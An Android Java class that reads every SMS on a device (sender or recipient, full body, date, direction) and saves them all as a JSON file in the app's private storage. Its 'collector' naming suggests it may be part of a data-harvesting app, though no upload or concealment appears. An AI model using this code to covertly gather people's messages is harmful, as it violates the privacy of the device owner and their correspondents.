package com.alzahra.collector;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SMSCollector {
    private static final String TAG = "SMSCollector";
    private final Context context;

    public SMSCollector(Context context) { this.context = context; }

    public File export() {
        try {
            JSONArray smsList = new JSONArray();
            ContentResolver resolver = context.getContentResolver();
            Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
            if (cursor == null) return null;
            try {
                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                int typeIdx = cursor.getColumnIndex(Telephony.Sms.TYPE);
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", getStringSafe(cursor, addressIdx));
                    sms.put("body", getStringSafe(cursor, bodyIdx));
                    long dateVal = getLongSafe(cursor, dateIdx);
                    sms.put("date", sdf.format(new Date(dateVal)));
                    int type = getIntSafe(cursor, typeIdx);
                    sms.put("type", type == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "received");
                    smsList.put(sms);
                }
            } finally { cursor.close(); }
            if (smsList.length() == 0) return null;
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "sms_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(smsList.toString(2));
            writer.close();
            Log.d(TAG, "SMS exported: " + smsList.length());
            return file;
        } catch (Exception e) { Log.e(TAG, "SMS export error", e); return null; }
    }

    private String getStringSafe(Cursor c, int idx) {
        if (idx < 0) return "";
        try { String val = c.getString(idx); return val != null ? val : ""; } catch (Exception e) { return ""; }
    }
    private long getLongSafe(Cursor c, int idx) {
        if (idx < 0) return 0;
        try { return c.getLong(idx); } catch (Exception e) { return 0; }
    }
    private int getIntSafe(Cursor c, int idx) {
        if (idx < 0) return 0;
        try { return c.getInt(idx); } catch (Exception e) { return 0; }
    }
}
